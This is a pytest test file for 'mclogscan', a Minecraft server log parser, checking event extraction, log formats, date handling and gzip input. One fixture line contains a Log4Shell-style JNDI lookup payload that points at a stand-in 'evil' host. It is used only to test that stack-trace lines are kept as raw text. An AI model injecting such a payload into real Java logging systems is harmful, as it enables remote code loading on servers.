import gzip
from datetime import date, datetime

from mclogscan.parser import find_log_files, parse_file, parse_lines


def test_vanilla_join_extracts_player_and_ip(parse):
    [e] = parse("[18:02:10] [Server thread/INFO]: Steve[/82.132.45.10:50122] logged in with entity id 211 at ([world]1, 2, 3)")
    assert e.event == "join"
    assert e.player == "Steve"
    assert e.ip == "82.132.45.10"
    assert e.level == "INFO"
    assert e.thread == "Server thread"
    assert e.timestamp == datetime(2026, 9, 20, 18, 2, 10)


def test_chat_and_command(parse):
    chat, secure_chat, cmd = parse(
        """
[18:00:00] [Async Chat Thread - #0/INFO]: <Alex> hello world
[18:00:01] [Server thread/INFO]: [Not Secure] <Alex> unsigned message
[18:00:02] [Server thread/INFO]: Alex issued server command: /home base
"""
    )
    assert (chat.event, chat.player, chat.content) == ("chat", "Alex", "hello world")
    assert (secure_chat.event, secure_chat.content) == ("chat", "unsigned message")
    assert (cmd.event, cmd.player, cmd.content) == ("command", "Alex", "/home base")


def test_disconnect_with_game_profile(parse):
    [e] = parse(
        "[18:14:10] [Server thread/INFO]: com.mojang.authlib.GameProfile@7a1b[id=<null>,name=Notch,"
        "properties={},legacy=false] (/91.240.118.50:39011) lost connection: Failed to verify username!"
    )
    assert e.event == "disconnect"
    assert e.player == "Notch"
    assert e.ip == "91.240.118.50"
    assert e.content == "Failed to verify username!"


def test_paper_format(parse):
    [e] = parse("[12:00:00 WARN]: Steve moved too quickly! 1.0,2.0,3.0")
    assert e.level == "WARN"
    assert e.player == "Steve"


def test_forge_format_uses_date_from_line():
    [e] = parse_lines(
        ["[24Sep2026 09:15:30.123] [Server thread/INFO] [minecraft/DedicatedServer]: <Steve> hi"]
    )
    assert e.timestamp == datetime(2026, 9, 24, 9, 15, 30)
    assert e.event == "chat"


def test_midnight_rollover(parse):
    before, after = parse(
        """
[23:59:58] [Server thread/INFO]: <Steve> almost midnight
[00:00:03] [Server thread/INFO]: <Steve> new day
"""
    )
    assert after.timestamp.date() == date(2026, 9, 21)
    assert after.timestamp > before.timestamp


def test_unrecognised_lines_are_kept_as_raw(parse):
    entries = parse(
        """
[18:00:00] [Server thread/ERROR]: Something broke
java.lang.RuntimeException: ${jndi:ldap://evil/a}
\tat com.example.Plugin.onChat(Plugin.java:42)
"""
    )
    assert [e.event for e in entries] == ["other", "raw", "raw"]
    assert entries[1].level == "ERROR"  # inherits from the previous line
    assert "jndi" in entries[1].message


def test_blank_lines_skipped_and_line_numbers_preserved(parse):
    entries = parse("[18:00:00] [Server thread/INFO]: a\n\n[18:00:01] [Server thread/INFO]: b")
    assert [e.line_no for e in entries] == [1, 3]


def test_gzip_and_invalid_bytes(tmp_path):
    path = tmp_path / "2026-09-19-1.log.gz"
    with gzip.open(path, "wb") as fh:
        fh.write(b"[10:00:00] [Server thread/INFO]: <Steve> caf\xff\xfe\n")
    [e] = parse_file(path)
    assert e.timestamp.date() == date(2026, 9, 19)  # date comes from the filename
    assert e.content.startswith("caf")  # bad bytes replaced, no crash


def test_find_log_files_in_directory(tmp_path):
    (tmp_path / "latest.log").write_text("")
    (tmp_path / "2026-01-01-1.log.gz").write_bytes(gzip.compress(b""))
    (tmp_path / "notes.txt").write_text("")
    names = [p.name for p in find_log_files(tmp_path)]
    assert names == ["2026-01-01-1.log.gz", "latest.log"]
